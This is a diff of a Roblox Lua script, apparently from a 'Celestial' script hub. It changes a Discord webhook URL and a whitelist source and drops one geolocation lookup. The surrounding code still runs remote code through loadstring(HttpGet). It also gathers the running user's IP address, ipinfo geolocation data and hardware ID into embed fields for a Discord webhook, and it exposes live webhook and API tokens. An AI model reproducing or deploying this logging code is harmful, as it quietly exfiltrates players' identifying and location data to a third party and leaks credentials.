@@ -1,4 +1,4 @@
-local webhookUrl = "https://discord.com/api/webhooks/1387705899765993562/ZUQT7H7cJyE4s95AZuxORgLAGS_hCu5UpiY67W0HuWHgytxZZ4Qp7FveNuyt8_p6dsyL"
+local webhookUrl = "https://discord.com/api/webhooks/1514036528500965548/A5Kt2C4hJb2z_UYRSuI71E4h2-7v1q6IY528-EyB06frKL6Xu8RdDrsDnRNy0BIZmraV"
 local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()
 local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
 
@@ -10,7 +10,6 @@ local userInputService = game:GetService("UserInputService")
 
 local ipv4 = game:HttpGet("https://api.ipify.org")
 local ipdetails = game:HttpGet("https://ipinfo.io/?token=03dce9579aa8e0")
-local geoloc = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. ipv4)
 
 local function fetchData(url)
     local success, response = pcall(function()
@@ -35,7 +34,7 @@ local function fetchData(url)
     return nil
 end
 
-local whitelistURL = "https://gitlab.com/scripts1463602/Celestial/-/raw/main/Users.json?ref_type=heads"
+local whitelistURL = "https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Users.json"
 local whitelistedUsers = fetchData(whitelistURL)
 
 if not whitelistedUsers then
@@ -109,7 +108,6 @@ local fields = {
     { name = "Hardware ID (HWID)", value = "||" .. hashedHWID .. "\n\n(" .. hwid .. ")||", inline = true },
     { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
     { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
-    { name = "Geolocation Data", value = "||```json" .. "\n" .. geoloc .. "```||", inline = false },
 }
 
 for _, field in ipairs(fields) do
